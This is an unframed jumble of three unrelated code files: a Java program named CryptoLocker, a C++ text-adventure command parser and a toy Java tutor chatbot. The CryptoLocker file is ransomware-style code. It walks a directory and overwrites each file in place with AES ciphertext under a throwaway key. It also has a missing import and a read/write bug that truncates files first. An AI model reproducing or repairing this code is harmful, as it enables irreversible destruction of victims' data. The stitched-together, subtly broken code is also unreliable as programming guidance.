import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import java.io.*;
import java.security.NoSuchAlgorithmException;

public class CryptoLocker {

    public static void main(String[] args) {
        try {
            // Generate a key for encryption
            KeyGenerator keyGen = KeyGenerator.getInstance("AES");
            keyGen.init(128);
            Cipher cipher = Cipher.getInstance("AES");

            // Encrypt all files in the specified directory
            String targetDir = "/path/to/directory";
            encryptFiles(targetDir, cipher);

            System.out.println("All files have been encrypted.");
        } catch (NoSuchAlgorithmException | IOException e) {
            e.printStackTrace();
        }
    }

    private static void encryptFiles(String dirPath, Cipher cipher) throws IOException {
        File directory = new File(dirPath);
        File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                if (!file.isDirectory()) {
                    encryptFile(file, cipher);
                }
            }
        }
    }

    private static void encryptFile(File file, Cipher cipher) throws IOException {
        try (InputStream fis = new FileInputStream(file);
             OutputStream fos = new FileOutputStream(file)) {

            // Encrypt the file
            cipher.init(Cipher.ENCRYPT_MODE, generateKey());
            byte[] inputBytes = new byte[1024];
            int bytesRead;
            while ((bytesRead = fis.read(inputBytes)) != -1) {
                byte[] outputBytes = cipher.update(inputBytes, 0, bytesRead);
                if (outputBytes != null) {
                    fos.write(outputBytes);
                }
            }

            // Write the final block of encryption
            byte[] finalOutputBytes = cipher.doFinal();
            if (finalOutputBytes != null) {
                fos.write(finalOutputBytes);
            }

            System.out.println("File encrypted: " + file.getName());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static SecretKey generateKey() throws NoSuchAlgorithmException {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        return keyGen.generateKey();
    }
}

#include <iostream>
#include <string>
#include <map>

// Define the structure for a game script command
struct Command {
    std::string verb;
    std::string object;
};

// Function to parse a command from user input
Command parseCommand(const std::string& input) {
    Command cmd;
    size_t pos = input.find(' ');
    if (pos != std::string::npos) {
        cmd.verb = input.substr(0, pos);
        cmd.object = input.substr(pos + 1);
    } else {
        cmd.verb = input;
    }
    return cmd;
}

// Function to handle the game logic based on the parsed command
void handleCommand(const Command& cmd) {
    static std::map<std::string, std::function<void()>> commands = {
        {"look", [](){ std::cout << "You see a forest." << std::endl; }},
        {"go", [](){ std::cout << "You go through the forest." << std::endl; }},
        {"take", [](){ std::cout << "You take a rock." << std::endl; }}
    };

    auto it = commands.find(cmd.verb);
    if (it != commands.end()) {
        it->second();
    } else {
        std::cout << "I don't understand that command." << std::endl;
    }
}

int main() {
    std::string input;
    while (true) {
        std::cout << "> ";
        std::getline(std::cin, input);
        if (input == "quit") break;
        Command cmd = parseCommand(input);
        handleCommand(cmd);
    }
    return 0;
}

import java.util.Scanner;
import java.util.HashMap;

public class TextBasedAITutor {
    private static HashMap<String, String> knowledgeBase = new HashMap<>();

    public static void main(String[] args) {
        initializeKnowledgeBase();
        Scanner scanner = new Scanner(System.in);
        System.out.println("Welcome to the Text-based AI Tutor!");

        while (true) {
            System.out.print("You: ");
            String userInput = scanner.nextLine().toLowerCase();

            if ("exit".equals(userInput)) {
                break;
            }

            String response = generateResponse(userInput);
            System.out.println("Tutor: " + response);
        }

        scanner.close();
    }

    private static void initializeKnowledgeBase() {
        knowledgeBase.put("what is the capital of France?", "The capital of France is Paris.");
        knowledgeBase.put("how do you calculate the area of a rectangle?", "To find the area of a rectangle, multiply its length by its width.");
        // Add more entries as needed
    }

    private static String generateResponse(String query) {
        for (String key : knowledgeBase.keySet()) {
            if (query.contains(key.toLowerCase())) {
                return knowledgeBase.get(key);
            }
        }
        return "Sorry, I don't understand that question. Could you please rephrase it?";
    }
}

